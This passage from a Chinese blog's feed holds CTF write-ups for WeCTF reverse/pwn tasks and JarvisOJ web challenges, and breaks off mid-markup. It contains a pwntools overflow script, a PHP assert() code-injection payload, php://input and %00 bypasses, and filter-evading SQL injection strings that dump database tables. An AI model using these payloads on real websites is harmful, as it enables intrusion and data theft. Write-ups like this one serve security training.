class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data=<span class="string">&quot;52 58 4D 53 67 51 22 4F 1C 52 23 4E 52 1C 50 4D 1F 52 1D 4F 23 23 4F 22 50 4F 4E 4F 23 1D 4D 20 21 1c 4d 21 1e 69&quot;</span></span><br><span class="line">data=data.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    a=<span class="string">&quot;0x&quot;</span>+i</span><br><span class="line">    a=<span class="built_in">int</span>(a,<span class="number">16</span>)+<span class="number">20</span></span><br><span class="line">    print(<span class="built_in">chr</span>(a),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e6c0f7bf0da3f1c77c6dcbc71a450a52&#125;</span><br></pre></td></tr></table></figure><h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>这个 base64 有点特别<br><img src="https://gitee.com/sncker/resource/raw/master/image/20191007103959.png" alt=""><br>s2为密文<br><img src="https://gitee.com/sncker/resource/raw/master/image/20191007104043.png" alt=""><br>跟进4006D6<br><img src="https://gitee.com/sncker/resource/raw/master/image/20191007104148.png" alt=""><br>base64加密函数，但是在加密前会将字母表前移一位，变异base64。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a = <span class="string">&quot;@ABCDEFGHIJKLMNOPQRSTUVWXY`abcdefghijklmnopqrstuvwxy/012345678*.&quot;</span></span><br><span class="line">b = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">base_fix = <span class="string">&quot;YlwgY2r2NCb4LSIkMlHyXiQiLyIlMiTwYSYhNSD/LyfxYSMgNW/=&quot;</span></span><br><span class="line">table = <span class="string">&#x27;&#x27;</span>.maketrans(a, b)</span><br><span class="line">print(base64.b64decode(base_fix.translate(table)))</span><br></pre></td></tr></table></figure><p>改一下映射关系即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;787912e6b3b4c32f651e6b914382e3a9&#125;</span><br></pre></td></tr></table></figure><h2 id="sign-in"><a href="#sign-in" class="headerlink" title="sign_in"></a>sign_in</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20191007104541.png" alt=""><br>.net直接上工具<br>看按钮点击函数<br><img src="https://gitee.com/sncker/resource/raw/master/image/20191007104729.png" alt=""><br>进行了AES加密，然后对比this.cmp<br><img src="https://gitee.com/sncker/resource/raw/master/image/20191007104819.png" alt=""><br>AES加密函数<br><img src="https://gitee.com/sncker/resource/raw/master/image/20191007104854.png" alt=""><br>在线工具<br><img src="https://gitee.com/sncker/resource/raw/master/image/20191007105110.png" alt=""></p><h2 id="king"><a href="#king" class="headerlink" title="king"></a>king</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20191007105310.png" alt=""><br>字符处理，看一下密文<br><img src="https://gitee.com/sncker/resource/raw/master/image/20191007105348.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">m = <span class="string">&quot;2k6915l15j7ikmml2i470j1648h79717&quot;</span></span><br><span class="line">dic = string.ascii_letters</span><br><span class="line"><span class="comment"># 大写 65~90 小写 97~122</span></span><br><span class="line"><span class="comment"># 如果是大写先减65加7最后模26+65</span></span><br><span class="line"><span class="comment"># 如果是小写写先减97加7最后模26+67</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">if</span> i.islower() &amp; (<span class="built_in">chr</span>((<span class="built_in">ord</span>(j) - <span class="number">97</span> + <span class="number">7</span>) % <span class="number">26</span> + <span class="number">97</span>) == i):</span><br><span class="line">            print(j, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> i.isupper() &amp; (<span class="built_in">chr</span>((<span class="built_in">ord</span>(j) - <span class="number">65</span> + <span class="number">7</span>) % <span class="number">26</span> + <span class="number">65</span>) == i):</span><br><span class="line">            print(j, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> (flag):</span><br><span class="line">       <span class="keyword">continue</span></span><br><span class="line">    print(i,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wectf&#123;2d6915e15c7bdffe2b470c1648a79717&#125;</span><br></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="BOF"><a href="#BOF" class="headerlink" title="BOF"></a>BOF</h2><p>没什么好说的，覆盖就完了<br><img src="https://gitee.com/sncker/resource/raw/master/image/20191007105702.png" alt=""><br>v4可控  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char v4; &#x2F;&#x2F; [rsp+0h] [rbp-20h]</span><br><span class="line">int v5; &#x2F;&#x2F; [rsp+1Ch] [rbp-4h]</span><br></pre></td></tr></table></figure><p>20h-4h=32-4=28</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;39.98.246.99&quot;</span>,<span class="string">&quot;10035&quot;</span>)</span><br><span class="line"><span class="comment">#p.recvuntil(&#x27;&gt;&#x27;)</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">28</span> + p32(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/sncker/resource/raw/master/image/20191007110051.png" alt=""></p><h2 id="nc签到"><a href="#nc签到" class="headerlink" title="nc签到"></a>nc签到</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20191007110155.png" alt=""><br>循环5次，输入的值相加等于1311768467463790320即可<br><img src="https://gitee.com/sncker/resource/raw/master/image/20191007110356.png" alt=""></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h2 id=&quot;web签到题&quot;&gt;&lt;a href=&quot;#web签到题&quot; class=&quot;headerlink&quot; title=&quot;web签到题&quot;&gt;&lt;/a&gt;web签到题&lt;/h2&gt;&lt;p&gt;直接看源代码  &lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;!DOCTYPE &lt;span class=&quot;meta-keyword&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;lang&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;meta&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;charset&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;UTF-8&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;meta&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;viewport&amp;quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;content&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;meta&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;http-equiv&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;X-UA-Compatible&amp;quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;content&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;ie=edge&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;flag is here&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    看不到 flag 吗？&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;&amp;lt;!-- wectf&amp;#123;the_iiiis_flag&amp;#125; --&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;拿到flag&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;wectf&amp;#123;the_iiiis_flag&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://sncker.github.io/blog/categories/CTF/"/>
    
    <category term="WriteUp" scheme="https://sncker.github.io/blog/categories/CTF/WriteUp/"/>
    
    
    <category term="WeCTF" scheme="https://sncker.github.io/blog/tags/WeCTF/"/>
    
  </entry>
  
  <entry>
    <title>JarvisOJ-WriteUp</title>
    <link href="https://sncker.github.io/blog/2019/09/28/JarvisOJ-WriteUp/"/>
    <id>https://sncker.github.io/blog/2019/09/28/JarvisOJ-WriteUp/</id>
    <published>2019-09-28T13:40:00.000Z</published>
    <updated>2020-05-01T07:03:16.262Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p>题目入口：<a href="http://web.jarvisoj.com:32798/">http://web.jarvisoj.com:32798/</a></p><p>看到说了用git考虑到git泄露  </p><p><img src="https://gitee.com/sncker/resource/raw/master/image/QQ%E6%88%AA%E5%9B%BE20190928232517.png" alt=""></p><p>试一下<a href="http://web.jarvisoj.com:32798/.git/HEAD">http://web.jarvisoj.com:32798/.git/HEAD</a>  </p><p><img src="https://gitee.com/sncker/resource/raw/master/image/QQ%E6%88%AA%E5%9B%BE20190929111746.png" alt=""><br>确定存在泄露，祭出工具GitHack  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http:&#x2F;&#x2F;web.jarvisoj.com:32798&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/sncker/resource/raw/master/image/QQ%E6%88%AA%E5%9B%BE20190928233528.png" alt="">  </p><a id="more"></a><p>泄露的flag.php文件肯定是没有flag的，主要还是看index.php<br><strong>index.php关键代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">...</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">...</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以传进一个$page，然后$page会和$file进行拼接，最后assert()中的表达式用到了$file。那么就可以通过构造$page进行代码注入，使assert()执行php代码。<br>我们构造  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;&#39;.show_source(&#39;templates&#x2F;flag.php&#39;).&#39;</span><br></pre></td></tr></table></figure><p>拼接后的$file就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">templates&#x2F;&#39;.show_source(&#39;templates&#x2F;flag.php&#39;).&#39;.php</span><br></pre></td></tr></table></figure><p>这样assert()的参数就不再是表达式而是字符串，那么assert()就会将这个字符串当作php代码执行。<br>所以我们构造的show_source(&#39;templates/flag.php&#39;)就会被执行。<br><img src="https://gitee.com/sncker/resource/raw/master/image/QQ%E6%88%AA%E5%9B%BE20190929132740.png" alt="">  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">61dctf&#123;8e_careful_when_us1ng_ass4rt&#125;</span><br></pre></td></tr></table></figure><h2 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h2><p>题目入口：<a href="http://web.jarvisoj.com:32780/">http://web.jarvisoj.com:32780/</a><br>进入看到<br><img src="https://gitee.com/sncker/resource/raw/master/image/20190929170907.png" alt=""><br>查看源代码发现  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--index.phps--&gt;work harder!harder!harder!</span><br></pre></td></tr></table></figure><p>访问index.phps拿到源码  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!--index.phps--&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">header(<span class="string">&#x27;Location: index.php?id=1&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos(<span class="variable">$a</span>,<span class="string">&#x27;.&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Hahahahahaha&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = @file_get_contents(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>==<span class="string">&quot;1112 is a nice lab!&quot;</span> <span class="keyword">and</span> <span class="variable">$id</span>==<span class="number">0</span> <span class="keyword">and</span> strlen(<span class="variable">$b</span>)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">&quot;111&quot;</span>.substr(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;1114&quot;</span>) <span class="keyword">and</span> substr(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;work harder!harder!harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析  </p><ol><li>如果$id传0就会跳转但下面的条件有$id==0，这里利用弱类型比较可以传字符也可以用0e去绕过。 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id&#x3D;asd</span><br><span class="line">$id&#x3D;0e1234</span><br></pre></td></tr></table></figure></li><li>$a可以使用伪协议php://input也可以用<a href="https://blog.csdn.net/qq1045553189/article/details/87479691。">data类型url</a>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a&#x3D;php:&#x2F;&#x2F;input    #然后POST一个内容为1112 is a nice lab!的body</span><br><span class="line">$a&#x3D;data:,1112 is a nice lab!    #data类型url</span><br></pre></td></tr></table></figure></li><li>$b可以采用%00去截断,%00在strlen()不截断在substr()中会截断所以substr($b,0,1)就截取不到东西所以eregi(“111”,”1114”)，substr($b,0,1)!=4都成立。  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$b&#x3D;%0012345</span><br></pre></td></tr></table></figure>payload:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;asd&amp;a&#x3D;data:,1112 is a nice lab!&amp;b&#x3D;%00123345</span><br></pre></td></tr></table></figure><img src="https://gitee.com/sncker/resource/raw/master/image/20190929200855.png" alt=""><br>返回一个/^HT2mCpcvOLf看起来像文件，访问发现是个目录名<br><img src="https://gitee.com/sncker/resource/raw/master/image/20190929201155.png" alt=""><br>源代码没东西，有个id参数，加个单引号<br><img src="https://gitee.com/sncker/resource/raw/master/image/20190929201459.png" alt=""><br>爆语句，应该是sql注入，测试一下过滤。<br>id等于1和0正常返回hi666，其它数字则会爆出语句。<br>空格会被拦截，union,select等关键词被过滤。<br>绕过姿势：空格用注释绕过/*1*/，关键词可用双写绕过，然后就是常规手工注入了。<br>测字段数  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id&#x3D;1&#x2F;*1*&#x2F;order&#x2F;*1*&#x2F;by&#x2F;*1*&#x2F;3</span><br></pre></td></tr></table></figure>3列，找回显位  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id&#x3D;-1&#x2F;*1*&#x2F;uniunionon&#x2F;*1*&#x2F;seleselectct&#x2F;*1*&#x2F;1,2,3</span><br></pre></td></tr></table></figure>回显位只有3,接下来爆表名  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id&#x3D;-1&#x2F;*1*&#x2F;uniunionon&#x2F;*1*&#x2F;seleselectct&#x2F;*1*&#x2F;1,2,table_name&#x2F;*1*&#x2F;frofromm&#x2F;*1*&#x2F;information_schema.tables&#x2F;*1*&#x2F;where&#x2F;*1*&#x2F;table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>返回表名为content，然后爆列名  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index.php?id&#x3D;-1&#x2F;*1*&#x2F;uniunionon&#x2F;*1*&#x2F;seleselectct&#x2F;*1*&#x2F;1,2,column_name&#x2F;*1*&#x2F;frofromm&#x2F;*1*&#x2F;information_schema.columns&#x2F;*1*&#x2F;where&#x2F;*1*&#x2F;table_name&#x3D;0x636f6e74656e74&#x2F;*1*&#x2F;limit&#x2F;*1*&#x2F;0,1</span><br><span class="line">index.php?id&#x3D;-1&#x2F;*1*&#x2F;uniunionon&#x2F;*1*&#x2F;seleselectct&#x2F;*1*&#x2F;1,2,column_name&#x2F;*1*&#x2F;frofromm&#x2F;*1*&#x2F;information_schema.columns&#x2F;*1*&#x2F;where&#x2F;*1*&#x2F;table_name&#x3D;0x636f6e74656e74&#x2F;*1*&#x2F;limit&#x2F;*1*&#x2F;1,1</span><br><span class="line">index.php?id&#x3D;-1&#x2F;*1*&#x2F;uniunionon&#x2F;*1*&#x2F;seleselectct&#x2F;*1*&#x2F;1,2,column_name&#x2F;*1*&#x2F;frofromm&#x2F;*1*&#x2F;information_schema.columns&#x2F;*1*&#x2F;where&#x2F;*1*&#x2F;table_name&#x3D;0x636f6e74656e74&#x2F;*1*&#x2F;limit&#x2F;*1*&#x2F;2,1</span><br></pre></td></tr></table></figure>这里content要用十六进制编码，然后爆出了id,context,title三个列名，按直觉直接查context列  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id&#x3D;-1&#x2F;*1*&#x2F;uniunionon&#x2F;*1*&#x2F;seleselectct&#x2F;*1*&#x2F;1,2,context&#x2F;*1*&#x2F;frofromm&#x2F;*1*&#x2F;content</span><br></pre></td></tr></table></figure>拿到flag  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCTF&#123;Fin4lly_U_got_i7_C0ngRatulation5&#125;</span><br></pre></td></tr></table></figure><h2 id="inject"><a href="#inject" class="headerlink" title="inject"></a>inject</h2></li></ol><p>题目入口：<a href="http://web.jarvisoj.com:32794/">http://web.jarvisoj.com:32794/</a><br>注入题，然后访问页面只显示个flag{xxx}，源代码里什么也没有。<br>hint说要先找到源代码<br>估计是有泄露，用扫描器扫一下找到了index.php~  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$table</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;table&#x27;</span>]?<span class="variable">$_GET</span>[<span class="string">&#x27;table&#x27;</span>]:<span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="variable">$table</span> = Filter(<span class="variable">$table</span>);</span><br><span class="line">mysqli_query(<span class="variable">$mysqli</span>,<span class="string">&quot;desc `secret_<span class="subst">&#123;$table&#125;</span>`&quot;</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select &#x27;flag&#123;xxx&#125;&#x27; from secret_<span class="subst">&#123;$table&#125;</span>&quot;</span>;</span><br><span class="line"><span class="variable">$ret</span> = sql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ret</span>[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>参数是table，如果没有传参$table就等于test。<br>Filter()是自定义的一个过滤函数。<br>测试了一下当table不等于test的时候就会输出Hello Hacker。可以知道是执行了Hacker()函数，说明前面的mysqli_query()执行不成功。<br>看到mysqli_query()的执行语句是  </p><figure class="highlight"><table><tr><td class="gutter"><pre><span 